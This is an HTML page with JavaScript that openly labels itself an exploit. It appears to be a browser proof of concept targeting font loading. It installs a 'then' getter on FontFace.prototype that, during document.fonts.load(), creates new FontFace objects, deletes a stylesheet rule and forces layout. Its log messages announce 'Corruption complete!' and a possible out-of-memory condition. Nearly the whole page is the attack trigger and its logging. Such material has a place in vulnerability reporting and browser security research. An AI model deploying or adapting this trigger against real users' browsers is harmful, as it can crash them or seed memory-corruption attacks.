<!DOCTYPE html>
<html>
<head>
<style id="s">
@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
</style>
</head>
<body>
<h1>Loading exploit...</h1>
<div id="log" style="font-family: monospace; font-size: 13px; white-space: pre; border: 1px solid white; padding: 10px; margin: 10px;"></div>
<script>
// Prevent multiple execution
if (!window.exploitRan) {
    window.exploitRan = true;
    
    let logBuffer = [];
    function log(msg) {
        logBuffer.push(msg);
        let d = document.getElementById('log');
        if (d) {
            d.textContent = logBuffer.join('\n');
        }
    }
    
    log('[*] Exploit starting...');
    log('[*] Time: ' + Date.now());
    
    // Wrap everything in try-catch
    try {
        let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
        log('[1] Created FontFace A');
        
        document.fonts.add(A);
        log('[2] Added A to document.fonts');
        
        void A.loaded;
        log('[3] Accessed A.loaded');
        
        let getterCallCount = 0;
        let fired = false;
        
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                getterCallCount++;
                log('[GETTER] Called ' + getterCallCount + ' time(s)');
                
                if (!fired && this === A) {
                    fired = true;
                    log('[GETTER] First valid call - executing exploit');
                    
                    try {
                        log('[GETTER] Creating y...');
                        let y = new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                        log('[GETTER] y created');
                        
                        log('[GETTER] Creating z...');
                        let z = new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                        log('[GETTER] z created');
                        
                        log('[GETTER] Deleting CSS rule...');
                        document.getElementById('s').sheet.deleteRule(0);
                        log('[GETTER] CSS deleted');
                        
                        log('[GETTER] Forcing layout...');
                        let offset = document.body.offsetTop;
                        log('[GETTER] offsetTop = ' + offset);
                        
                        log('[GETTER] Corruption complete!');
                        
                        // Quick exploitation before return
                        log('[EXPLOIT] y.status: ' + y.status);
                        log('[EXPLOIT] z.status: ' + z.status);
                        log('[EXPLOIT] y.family: ' + y.family);
                        
                    } catch(e) {
                        log('[GETTER] ERROR: ' + e.message);
                    }
                    
                    log('[GETTER] About to return undefined (OOM may happen)');
                } else {
                    log('[GETTER] Skipped (fired=' + fired + ', correct_this=' + (this === A) + ')');
                }
                
                return undefined;
            }
        });
        
        log('[4] Installed getter');
        log('[5] Calling fonts.load()...');
        
        document.fonts.load('1em x', 'AB');
        
        log('[6] fonts.load() returned (unexpected if OOM happens)');
        
    } catch(e) {
        log('[ERROR] ' + e.message);
        log('[STACK] ' + e.stack);
    }
    
    log('[*] Script end');
    
} else {
    document.getElementById('log').textContent = '[!] Exploit already ran - prevented re-execution';
}
</script>
</body>
</html>
